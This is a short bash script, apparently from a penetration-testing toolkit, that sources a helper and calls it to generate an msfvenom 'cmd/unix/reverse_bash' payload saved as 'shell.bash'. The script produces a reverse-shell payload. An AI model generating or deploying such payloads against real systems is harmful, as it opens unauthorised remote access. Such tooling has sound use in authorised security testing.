#!/bin/bash

: '
Create Bash file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="cmd/unix/reverse_bash"
format="raw"
filename="shell.bash"

create_reverse_shell "${payload}" "${format}" "${filename}"